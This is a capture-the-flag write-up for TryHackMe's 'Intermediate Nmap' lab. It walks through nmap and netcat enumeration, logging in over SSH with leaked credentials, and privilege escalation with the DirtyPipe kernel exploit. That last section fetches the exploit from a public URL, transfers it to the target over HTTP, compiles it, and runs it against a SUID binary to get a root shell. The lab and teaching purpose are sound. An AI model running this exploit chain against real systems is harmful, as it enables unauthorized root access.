# Intermediate Nmap

## Introduction

Welcome to my another writeup! In this TryHackMe [Intermediate Nmap](https://tryhackme.com/room/intermediatenmap) room, you can learn how to use `nmap`, `netcat` and `ssh`! Without further ado, let's dive in.

## Background

> Can you combine your great nmap skills with other tools to log in to this machine?

> Difficulty: Easy

- Overall difficulty for me: Very easy
    - Initial foothold: Very easy
    - Privilege escalation: Very easy

```
You've learned some great nmap skills! Now can you combine that with other skills with netcat and protocols, to log in to this machine and find the flag? This VM MACHINE_IP is listening on a high port, and if you connect to it it may give you some information you can use to connect to a lower port commonly used for remote access!
```

# Service Enumeration

> Note: Since this room is specifically using `nmap`, so I won't use `rustscan` in here.

**Nmap light scan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Intermediate_Nmap]
└─# nmap -sT -T4 $RHOSTS -oN nmap-lightscan.txt
[...]
PORT      STATE SERVICE
22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
31337/tcp open  Elite
```

**Options:**
- sT -> Full TCP scan (TCP three-way handshake, SYN, SYN/ACK, ACK)
- T4 -> Timing template 4 (Scan faster)
- oN -> Output the scan in normal format

## Port 31337

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Intermediate_Nmap]
└─# nc -nv $RHOSTS 31337
(UNKNOWN) [10.10.200.24] 31337 (?) open
In case I forget - user:pass
ubuntu:{Redacted}
```

**Found SSH credentials!**

## SSH on Port 2222

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Intermediate_Nmap]
└─# nc -nv $RHOSTS 2222 
(UNKNOWN) [10.10.200.24] 2222 (?) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
```

# Initial Foothold

**SSH on port 2222:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Intermediate_Nmap]
└─# ssh ubuntu@$RHOSTS -p 2222
[...]
ubuntu@10.10.200.24: Permission denied (publickey).
```

**Unable to `ssh` into port 2222.**

**SSH on Port 22:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Intermediate_Nmap]
└─# ssh ubuntu@$RHOSTS              
[...]
$ whoami;hostname;id
ubuntu
f518fa10296d
```

We're user `ubuntu`!

**Spawn a bash PTY shell:**
```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
ubuntu@f518fa10296d:~$ 
```

**flag.txt:**
```
ubuntu@f518fa10296d:~$  cat /home/user/flag.txt
flag{Redacted}
```

# Privilege Escalation (Optional)

**LinPEAS:**
```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.13.0-1014-aws (buildd@lgw01-amd64-060) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #15~20.04.1-Ubuntu SMP Thu Feb 10 17:55:03 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:    20.04
Codename:   focal
[...]
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

Vulnerable to CVE-2022-0847
[...]
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
[...]
```

According to [LinPEAS](https://github.com/carlospolop/PEASS-ng)'s output, we can see that **it might vulnerable to [DirtyPipe](https://haxx.in/files/dirtypipez.c).** We can try that exploit to gain root privilege!

**To do so, I'll:**

- Download the [DirtyPipe](https://haxx.in/files/dirtypipez.c) exploit:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Intermediate_Nmap]
└─# wget https://haxx.in/files/dirtypipez.c
```

Since the target machine has `gcc` installed, I'll transfer the exploit to there, compile it and run it:

**Check is `gcc` installed or not:**
```
ubuntu@f518fa10296d:~$ which gcc
/usr/bin/gcc
```

- Transfer the exploit:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Intermediate_Nmap]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

ubuntu@f518fa10296d:~$ wget http://10.18.61.134/dirtypipez.c -O /tmp/dirtypipez.c

ubuntu@f518fa10296d:~$ gcc /tmp/dirtypipez.c -o /tmp/dirtypipez
ubuntu@f518fa10296d:~$ /tmp/dirtypipez 
Usage: /tmp/dirtypipez SUID
```

Also, if you read through the C exploit, you'll see that it needs a SUID binary. Let's `find` one of those binary:

```
ubuntu@f518fa10296d:/$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/sudo
```

I'll take `/usr/bin/chfn` as an example, you can choose any SUID binary.

- Run the exploit:

```
ubuntu@f518fa10296d:~$ /tmp/dirtypipez /usr/bin/chfn
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# python3 -c "import pty;pty.spawn('/bin/bash')"
root@f518fa10296d:/# whoami;id      
root
uid=0(root) gid=0(root) groups=0(root),1000(ubuntu)
```

I'm root! :D

# Conclusion

What we've learned:

1. Port Scanning via `nmap`
2. Connect To Open Ports via `netcat`
3. Privilege Escalation via Kernel Exploit (DirtyPipe)